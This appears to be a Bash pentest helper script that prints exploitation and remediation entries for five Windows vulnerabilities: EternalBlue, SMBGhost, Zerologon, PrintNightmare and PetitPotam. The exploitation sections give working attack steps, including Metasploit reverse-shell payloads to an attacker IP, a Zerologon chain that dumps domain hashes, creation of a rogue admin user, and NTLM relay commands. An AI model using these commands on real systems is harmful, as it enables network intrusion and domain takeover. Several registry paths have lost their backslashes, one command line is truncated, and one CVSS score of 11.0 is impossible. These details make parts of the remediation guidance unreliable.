#!/bin/bash

# ========================================================================
# AKUMA'S VULNERABILITY KNOWLEDGE BASE v2.0
# База знаний с методами эксплуатации и рекомендациями по исправлению
# ========================================================================

# Функция получения детальной информации об уязвимости
get_vulnerability_details() {
    local vulnerability="$1"
    local target="$2"
    
    case "$vulnerability" in
        "ms17-010")
            cat << 'EOF'
VULNERABILITY: MS17-010 (EternalBlue)
CVE: CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, CVE-2017-0147, CVE-2017-0148
CVSS SCORE: 8.1 (High) / 9.3 (Critical with RCE)
DESCRIPTION: Critical vulnerability in SMBv1 server allowing remote code execution

EXPLOITATION METHODS:
1. Metasploit Framework:
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS [TARGET]
   set payload windows/x64/meterpreter/reverse_tcp
   set LHOST [YOUR_IP]
   exploit

2. Manual exploit with Python:
   git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
   cd AutoBlue-MS17-010
   python eternalblue_exploit7.py [TARGET] shellcode/sc_x64.bin

3. Nmap NSE script validation:
   nmap --script smb-vuln-ms17-010 -p 445 [TARGET]

4. CrackMapExec validation:
   nxc smb [TARGET] -M ms17-010

REMEDIATION:
1. IMMEDIATE ACTIONS:
   - Install Microsoft Security Bulletin MS17-010
   - Apply KB4013389 (Windows 7/2008 R2)
   - Apply KB4012598 (Windows 10/2016)
   - Apply KB4012212, KB4012213, KB4012214, KB4012215, KB4012216, KB4012217

2. CONFIGURATION CHANGES:
   - Disable SMBv1: powershell "Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol"
   - Enable SMB signing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
   - Block TCP 445 on perimeter firewalls

3. VERIFICATION:
   Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

REFERENCES:
- https://nvd.nist.gov/vuln/detail/CVE-2017-0144
- https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
EOF
            ;;
            
        "smbghost")
            cat << 'EOF'
VULNERABILITY: SMBGhost (SMBv3 Compression RCE)
CVE: CVE-2020-0796
CVSS SCORE: 10.0 (Critical)
DESCRIPTION: Critical RCE vulnerability in Windows SMBv3.1.1 compression mechanism

EXPLOITATION METHODS:
1. Metasploit Framework:
   use exploit/windows/smb/cve_2020_0796_smbghost
   set RHOSTS [TARGET]
   set payload windows/x64/meterpreter/reverse_tcp
   set LHOST [YOUR_IP]
   exploit

2. Manual PoC:
   git clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git
   python3 smbghost_exploit.py -ip [TARGET] -port 445

3. Detection script:
   git clone https://github.com/ollypwn/SMBGhost.git
   python3 scanner.py [TARGET]

4. PowerShell detection:
   Get-ItemProperty "HKLM:SYSTEMCurrentControlSetServiceslanmanserverparameters" RequireSecuritySignature

REMEDIATION:
1. IMMEDIATE PATCHES:
   - Windows 10 v1903/1909: Install KB4551762
   - Windows Server v1903/1909: Install KB4551762  
   - Windows 10 v2004: Install KB4551763
   - Windows Server v2004: Install KB4551763

2. TEMPORARY WORKAROUND (until patching):
   - Disable SMBv3 compression:
     Set-ItemProperty -Path "HKLM:SYSTEMCurrentControlSetServiceslanmanserverparameters" DisableCompression -Type DWORD -Value 1 -Force
   - Restart LanmanServer service: Restart-Service -Name LanmanServer -Force
   - Block TCP 445 on perimeter

3. VERIFICATION:
   Get-ItemProperty -Path "HKLM:SYSTEMCurrentControlSetServiceslanmanserverparameters" -Name DisableCompression

REFERENCES:
- https://nvd.nist.gov/vuln/detail/CVE-2020-0796
- https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796
EOF
            ;;
            
        "zerologon")
            cat << 'EOF'
VULNERABILITY: Zerologon (Netlogon Elevation of Privilege)
CVE: CVE-2020-1472
CVSS SCORE: 10.0 (Critical)
DESCRIPTION: Critical privilege escalation allowing domain admin takeover

EXPLOITATION METHODS:
1. Impacket exploit:
   python3 zerologon_exploit.py [DC_NAME] [DC_IP]
   
2. CrackMapExec:
   nxc smb [DC_IP] -M zerologon
   
3. Manual exploit:
   git clone https://github.com/SecuraBV/CVE-2020-1472.git
   python3 zerologon_tester.py [DC_NAME] [DC_IP]

4. Complete exploitation chain:
   # Step 1: Reset machine account
   python3 zerologon_exploit.py [DC_NAME] [DC_IP]
   # Step 2: DCSync to get admin hashes  
   secretsdump.py -just-dc [DOMAIN]/[DC_NAME]$@[DC_IP] -no-pass
   # Step 3: Restore original password
   python3 restorepassword.py [DOMAIN]/[ADMIN]@[DC_NAME] -target-ip [DC_IP] -hexpass [HEX_PASS]

REMEDIATION:
1. IMMEDIATE PATCHES:
   - Install KB4571694 (August 2020) on all Domain Controllers
   - Install KB4571692 (Windows Server 2019)
   - Install KB4571687 (Windows Server 2016)
   - Install KB4571694 (Windows Server 2012 R2)

2. REGISTRY HARDENING:
   - Enable enforcement mode after patching:
     [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesNetlogonParameters]
     "RequireStrongKey"=dword:00000001

3. MONITORING:
   - Monitor Event ID 5829 for Netlogon authentication failures
   - Implement network segmentation for DC traffic

REFERENCES:
- https://nvd.nist.gov/vuln/detail/CVE-2020-1472
- https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections
EOF
            ;;
            
        "printnightmare")
            cat << 'EOF'
VULNERABILITY: PrintNightmare (Print Spooler RCE/LPE)
CVE: CVE-2021-1675, CVE-2021-34527  
CVSS SCORE: 8.8 (High) / 11.0 (Critical with RCE)
DESCRIPTION: Critical RCE/LPE in Windows Print Spooler service

EXPLOITATION METHODS:
1. Impacket exploit:
   python3 CVE-2021-1675.py [DOMAIN]/[USER]:[PASS]@[TARGET] '\path o
   python3 CVE-2021-1675.py [DOMAIN]/[USER]:[PASS]@[TARGET] 'C:WindowsSystem32DriverStoreFileRepositoryrmclientmprintrclient.dll'

2. PowerShell local exploit:
   git clone https://github.com/calebstewart/CVE-2021-1675.git
   powershell -ep bypass
   Import-Module .CVE-2021-1675.ps1
   Invoke-Nightmare -NewUser "hacker" -NewPassword "Password123!"

3. CrackMapExec detection:
   nxc smb [TARGET] -M printnightmare

REMEDIATION:
1. IMMEDIATE PATCHES:
   - Install KB5004945 (July 2021 Cumulative Update)
   - Windows 10: KB5004237, KB5004245  
   - Windows Server 2019: KB5004244
   - Windows Server 2016: KB5004238

2. SERVICE HARDENING:
   - Disable Print Spooler if not needed:
     Stop-Service -Name Spooler -Force
     Set-Service -Name Spooler -StartupType Disabled
   
3. REGISTRY RESTRICTIONS:
   - Restrict Point and Print:
     [HKEY_LOCAL_MACHINESoftwarePoliciesMicrosoftWindows NTprinters]
     "RestrictDriverInstallationToAdministrators"=dword:00000001

REFERENCES:
- https://nvd.nist.gov/vuln/detail/CVE-2021-34527
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527
EOF
            ;;
            
        "petitpotam")
            cat << 'EOF'
VULNERABILITY: PetitPotam (NTLM Relay Attack)
CVE: CVE-2021-36942
CVSS SCORE: 7.5 (High)
DESCRIPTION: NTLM relay attack vulnerability allowing authentication coercion

EXPLOITATION METHODS:
1. Basic PetitPotam:
   python3 PetitPotam.py [LISTENER_IP] [TARGET_IP]

2. Full relay chain:
   # Setup relay
   ntlmrelayx.py -t ldaps://[DC_IP] --escalate-user [LOW_PRIV_USER]
   # Trigger authentication  
   python3 PetitPotam.py [RELAY_IP]:445 [TARGET_IP]

3. Certificate Authority targeting:
   python3 PetitPotam.py [CA_SERVER] [TARGET_DC]

REMEDIATION:
1. IMMEDIATE PATCHES:
   - Install KB5005413 (August 2021)
   - Windows Server 2019: KB5005030
   - Windows Server 2016: KB5005043

2. CONFIGURATION HARDENING:
   - Enable EPA (Extended Protection for Authentication)
   - Disable NTLM authentication where possible
   - Enable SMB signing requirements

3. MONITORING:
   - Monitor Event ID 4624 for unexpected authentication
   - Implement network segmentation

REFERENCES:
- https://nvd.nist.gov/vuln/detail/CVE-2021-36942
- https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-a23d-b87910390193
EOF
            ;;
            
        *)
            echo "VULNERABILITY: Unknown vulnerability type: $vulnerability"
            echo "No detailed information available in knowledge base."
            ;;
    esac
}

# Функция получения краткого описания эксплуатации
get_exploit_summary() {
    local vulnerability="$1"
    
    case "$vulnerability" in
        "ms17-010")
            echo "EXPLOIT: use exploit/windows/smb/ms17_010_eternalblue | PoC: AutoBlue-MS17-010.git | FIX: Install MS17-010 patches + Disable SMBv1"
            ;;
        "smbghost")
            echo "EXPLOIT: use exploit/windows/smb/cve_2020_0796_smbghost | PoC: SMBGhost_RCE_PoC.git | FIX: Install KB4551762/KB4551763 + Disable SMBv3 compression"
            ;;
        "zerologon")
            echo "EXPLOIT: zerologon_exploit.py [DC_NAME] [DC_IP] | PoC: CVE-2020-1472.git | FIX: Install KB4571694 + Enable RequireStrongKey"
            ;;
        "printnightmare")
            echo "EXPLOIT: CVE-2021-1675.py [DOMAIN]/[USER]:[PASS]@[TARGET] | PoC: CVE-2021-1675.git | FIX: Install KB5004945 + Disable Print Spooler"
            ;;
        "petitpotam")
            echo "EXPLOIT: PetitPotam.py [LISTENER_IP] [TARGET_IP] + ntlmrelayx | PoC: PetitPotam.git | FIX: Install KB5005413 + Enable EPA"
            ;;
        *)
            echo "EXPLOIT: Manual testing required | PoC: Research needed | FIX: Consult vendor documentation"
            ;;
    esac
}

# Функция генерации рекомендаций по приоритетности
get_priority_recommendations() {
    local vulnerability="$1"
    
    case "$vulnerability" in
        "ms17-010"|"smbghost"|"zerologon")
            echo "PRIORITY: CRITICAL - Patch immediately within 24 hours. High risk of lateral movement and complete domain compromise."
            ;;
        "printnightmare")
            echo "PRIORITY: HIGH - Patch within 72 hours. Risk of privilege escalation and lateral movement."
            ;;
        "petitpotam")
            echo "PRIORITY: MEDIUM - Patch within 1 week. Risk of NTLM relay attacks in specific configurations."
            ;;
        *)
            echo "PRIORITY: MEDIUM - Review and patch according to change management procedures."
            ;;
    esac
}
